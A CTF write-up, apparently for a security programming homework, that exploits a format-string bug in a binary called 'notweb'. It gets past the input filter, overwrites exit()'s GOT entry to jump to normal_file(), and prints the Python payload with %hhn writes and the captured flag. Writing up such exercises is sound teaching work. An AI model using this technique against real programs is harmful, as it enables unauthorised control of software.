================
 notweb Writeup
================

:date: 2014-11-27 18:00
:modified: 2014-12-17 01:31
:tags: secprog, ctf, writeup
:category: memo
:slug: notweb-writeup
:authors: Zespre Schmidt
:about_author: Bug generator
:email: starbops@gmail.com
:summary: Security Programming Homework 3-2

Finding Weak Points
===================

使用 gdb 進行 dynamic analysis 發現 ``main()`` 會 call ``get_request()`` ，下斷
點在 call ``get_request()`` 的地方 step in 進去一步一步看。程式呼叫 ``fgets()``
讀取 input，並會以 ``strtok()`` 根據空白來截斷字串。若整個 string 只有一個 word
的話會 call exit 程式結束，否則繼續執行下去。

.. code-block:: nasm

    08048a51:       89 45 ec                mov    DWORD PTR [ebp-0x14],eax
    08048a54:       83 7d ec 00             cmp    DWORD PTR [ebp-0x14],0x0
    08048a58:       75 0c                   jne    8048a66 <get_request+0x90>
    08048a5a:       c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
    08048a61:       e8 ea fb ff ff          call   8048650 <exit@plt>

``buf`` 吃進一行所有 input，並依序依照 ' ' 和 ':' 來截斷各個 token，示意圖如下：

.. code-block:: text

    ORIGINAL INPUT:

    GET /echo:%x%x%x%x%x
    |   |     |
    |   |     v
    |   v     被存入 ``main()`` 中的 local variable，在此以 ``s`` 作為範例
    v   字串長度為 5，第一個字元後被存入 global ``file``
    被捨棄

此外在 ``echo()`` 中看到又 ``printf(buf)`` 這樣的 code，可利用 format string
leak 任意 memory 甚至寫值進去。

xxx yyy:zzz

yyy <= 19: filename
zzz 可以 100000 長

0x0804b140: <buf>
0x080637e0: <file>

Weird Filter
============

在 ``get_request()`` 中，return 前會將 global ``buf`` 前 n 個字元清空，導致在
``filter_format()`` 中的第二個 for loop 不會有效果。因為 global ``buf`` 前段早已
被清為 0，一開始字串長度判定是 0，馬上離開 for loop。因此 global ``buf`` 維持原
樣，'%' 不會被替換為 '_'。

在 ``echo()`` 中，呼叫完 ``filter_format()`` 後，會將 ':' 後的字串（'%' 已被替換
成 '_'）複製到 global ``buf`` 的前段，導致可能覆蓋到 global ``buf`` 中  ':' 後的
字串（'%' 未被替換為 '_'），因此若要利用 format string 來進行 exploit 的話，需要
額外的計算以確保目標 string 不被程式破壞。

根據上述所提供的範例輸入字串，在 ``echo()`` 中執行 ``printf(buf)`` 前 global
``buf`` 的值會是：

.. code-block:: text

    _x_x_x_x_x\nx%x%x%x%x\n

印出來的的結果會是：

.. code-block:: text

    _x_x_x_x_x
    xfffe4f4cbf7f4b3d00

如果 ':' 後的字串長度（包含 '\n'）長度剛好是 10 的話，可以蓋到 ':' 那格（':' 因
``strtok`` 而被置換為 string terminator），如此一來字串又可以重新連成一氣，':'
後面即是我們原本的 format string。

若長度不足 10 的話，就在 ':' 與 format string 之間補字元（內容不重要），確保可以
重新把 global ``buf`` 接起來：

.. code-block:: text

    GET /echo:aaaaaaa%p

長度大於 10 的字串，必須要在 input 最前面補上多出來的部分（內容不重要），才不會
蓋到後面的 format string：

.. code-block:: text

    GGET /echo:%p%p%p%p%p

Objective
=========

在 ``echo()`` 中它的 return address 位於 $esp+0x1c，也就是用 ``%7$p`` 可以 leak
return address（當然要補滿到 10 個字元）。我們的目標是改寫這裏的 address
（0x0804917f）成 ``normal_file()`` 的 address（0x08048c8f）。除此之外 global
``file`` 的內容也要改成 "flag"，如此以來 ``normal_file()`` 才能開啟 flag 並且讀
取內容。但事情並沒有想像中的那般單純，因為 remote 端有開啟 ASLR，因此 return
address 實際上在 stack 中的位置我們是無法得知的，就無法透過 format string 的方式
寫值。

Return address 無法修改，但其實還有別的方法可以控制 $eip，就是運用 GOT table。
``fflush()`` 在 GOT table 中的 offset 為 0x804b018 其內容為 ``fflush()`` 實際所
在的位置（0xf7e78760）。只要將 ``fflush()`` 所在位置移花接木到 ``normal_file()``
即可。但在實測後發現 ``normal_file()`` 中也有 ``fflush()`` ，這將導致無窮遞迴。
改用 ``exit()`` 即可避免。 ``exit()`` 在 GOT table 中的 offset 為 0x0804b03c。

.. code-block:: bash

    $ readelf -r notweb

    Relocation section '.rel.dyn' at offset 0x49c contains 3 entries:
     Offset     Info    Type            Sym.Value  Sym. Name
     0804affc  00000c06 R_386_GLOB_DAT    00000000   __gmon_start__
     0804b080  00001805 R_386_COPY        0804b080   stdin
     0804b0a0  00001605 R_386_COPY        0804b0a0   stdout

    Relocation section '.rel.plt' at offset 0x4b4 contains 21 entries:
     Offset     Info    Type            Sym.Value  Sym. Name
     0804b00c  00000107 R_386_JUMP_SLOT   00000000   strstr
     0804b010  00000207 R_386_JUMP_SLOT   00000000   strcmp
     0804b014  00000307 R_386_JUMP_SLOT   00000000   printf
     0804b018  00000407 R_386_JUMP_SLOT   00000000   fflush
     0804b01c  00000507 R_386_JUMP_SLOT   00000000   memcpy
     0804b020  00000607 R_386_JUMP_SLOT   00000000   bzero
     0804b024  00000707 R_386_JUMP_SLOT   00000000   fgets
     0804b028  00000807 R_386_JUMP_SLOT   00000000   fclose
     0804b02c  00000907 R_386_JUMP_SLOT   00000000   chdir
     0804b030  00000a07 R_386_JUMP_SLOT   00000000   fseek
     0804b034  00000b07 R_386_JUMP_SLOT   00000000   fread
     0804b038  00000c07 R_386_JUMP_SLOT   00000000   __gmon_start__
     0804b03c  00000d07 R_386_JUMP_SLOT   00000000   exit
     0804b040  00000e07 R_386_JUMP_SLOT   00000000   strlen
     0804b044  00000f07 R_386_JUMP_SLOT   00000000   __libc_start_main
     0804b048  00001007 R_386_JUMP_SLOT   00000000   write
     0804b04c  00001107 R_386_JUMP_SLOT   00000000   ftell
     0804b050  00001207 R_386_JUMP_SLOT   00000000   fopen
     0804b054  00001307 R_386_JUMP_SLOT   00000000   strncpy
     0804b058  00001407 R_386_JUMP_SLOT   00000000   strtok
     0804b05c  00001507 R_386_JUMP_SLOT   00000000   sprintf

除了控制 $eip 以外，還有 global variable ``file`` 需要將其值改寫為 "flag"。

Exploitation
============

關鍵在於如何同時設計好 payload 又可以完美的不被程式的 filter 給破壞掉原本的
format string。 以下為 exploit 程式的主要片段。

.. code-block:: python

    # exit()'s offset in GOT showed up in stack fram
    # normal_file() @ 0x08048c8f
    # total 16 bytes
    addr1  = struct.pack('<I', 0x0804b03c) # 0x8f
    addr1 += struct.pack('<I', 0x0804b03d) # 0x8c
    addr1 += struct.pack('<I', 0x0804b03e) # 0x04
    addr1 += struct.pack('<I', 0x0804b03f) # 0x08

    # file's address showed up in stack frame
    # file @ 0x080637e0
    # total 16 bytes
    addr2  = struct.pack('<I', 0x080637e0) # 'f': 0x66 102
    addr2 += struct.pack('<I', 0x080637e1) # 'l': 0x6c
    addr2 += struct.pack('<I', 0x080637e2) # 'a': 0x61
    addr2 += struct.pack('<I', 0x080637e3) # 'g': 0x67

    inject1 = '%7c%15$hhn%253c%16$hhn%120c%17$hhn%4c%18$hhn' # 44 bytes
    inject2 = '%78c%30$hhn%6c%31$hhn%245c%32$hhn%6c%33$hhna' # 44 bytes

    padding = 'G'*110

    payload = padding + 'GET /echo:' + addr1 + inject1 + addr2 + inject2 + '\n'

Flag
====

The flag is:

.. code-block:: text

    SECPROG{But_PWN_!s_e@sier_th@n_WEB_XDDDD}

